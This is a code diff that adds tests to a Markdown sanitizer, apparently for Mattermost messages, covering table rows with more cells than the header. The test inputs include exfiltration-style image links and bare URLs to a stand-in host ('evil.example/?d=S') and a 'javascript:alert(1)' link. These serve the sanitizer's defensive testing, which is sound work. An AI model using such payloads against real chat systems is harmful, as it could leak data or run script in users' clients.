@@ -234,6 +234,14 @@ fn explain(src: &str) -> &'static str {
             Event::Text(_) if src[r.clone()].contains("![") => {
                 found = "1 image opener in text";
             }
+            // Extra cells of a table row: the parser drops them, Mattermost renders them.
+            Event::Start(Tag::Table(aligns)) => {
+                let mut v = Vec::new();
+                table_excess_edits(src, &r, aligns.len(), &mut v);
+                if !v.is_empty() {
+                    found = "7 table cells beyond the header";
+                }
+            }
             // D-270: a bare URL or an autolink becomes a labelled link.
             Event::Start(Tag::Link {
                 link_type: LinkType::Autolink,
@@ -370,6 +378,8 @@ fn fragments() -> impl Strategy<Value = String> {
         "!<a href=\"https://e.example/p.png\">x</a>",
         "<code>@here</code>",
         "https://e.example/?d=SECRET",
+        "|a|b|\n|-|-|\n|1|2|![x](https://e.example/?d=S)|",
+        "|a|b|\n|-|-|\n|1|2|https://e.example/?d=S|",
         "see https://e.example/a_b.",
         "<https://e.example/x>",
         "<div>https://e.example/?d=S</div>",
@@ -586,6 +596,48 @@ fn html_bare_url_left(s: &str) -> bool {
         }
     }
     false
+}
+
+/// Found by the dev server (FIX-142, D-270): GFM drops the cells of a row beyond the header's
+/// width, so the parser shows none of their content — but Mattermost 11.7.15 *renders* them
+/// (an image, a bare URL it fetches, an `@channel`). The sanitizer escapes the pipe that starts
+/// an extra cell, so the content is text of the last cell and gets every other rewrite.
+#[test]
+fn cells_beyond_the_header_are_part_of_the_last_cell() {
+    for src in [
+        "|a|b|\n|-|-|\n|1|2|![x](https://evil.example/?d=S)|",
+        "|a|b|\n|-|-|\n|1|2|https://evil.example/?d=S|",
+        "a | b\n--|--\n1 | 2 | ![x](https://evil.example/?d=S)",
+        "> |a|b|\n> |-|-|\n> |1|2|![x](https://evil.example/?d=S)|",
+        "|a|b|\n|-|-|\n|1|`x|y`|![x](https://evil.example/?d=S)|z|",
+        "|a|b|\n|-|-|\n|1|2|[x](javascript:alert(1))|",
+    ] {
+        let out = md(src);
+        assert!(no_live_image_opener(&out), "{src:?} -> {out:?}");
+        assert!(!bare_url_left(&out), "{src:?} -> {out:?}");
+        assert!(!out.contains("](javascript"), "{src:?} -> {out:?}");
+        // (the parser shows nothing of a dropped cell: look at the text itself)
+        assert!(out != src && out.contains("\\|"), "{src:?} -> {out:?}");
+        for hot in ["|![", "|https://", "|[x](", "| ![", "| https://"] {
+            let at = out.find(hot);
+            assert!(
+                at.is_none_or(|i| out[..i].ends_with('\\')),
+                "an unescaped pipe still starts an extra cell: {src:?} -> {out:?}"
+            );
+        }
+        assert_eq!(md(&out), out, "idempotent: {src:?}");
+        // The table is still a table of two columns, every body row with at most two cells.
+        let html = render(&out);
+        assert!(html.contains("<table>"), "{src:?} -> {html}");
+    }
+    // A well-formed table is untouched, an escaped pipe is not a separator.
+    for same in [
+        "|a|b|\n|-|-|\n|1|2|",
+        "| a | b |\n|---|---|\n| 1 \\| x | 2 |",
+        "|a|b|\n|-|-|\n|1|",
+    ] {
+        assert_eq!(md(same), same);
+    }
 }
 
 /// Review 3 (2): a link joint (`](`) or a definition line that pulldown did not form is still a
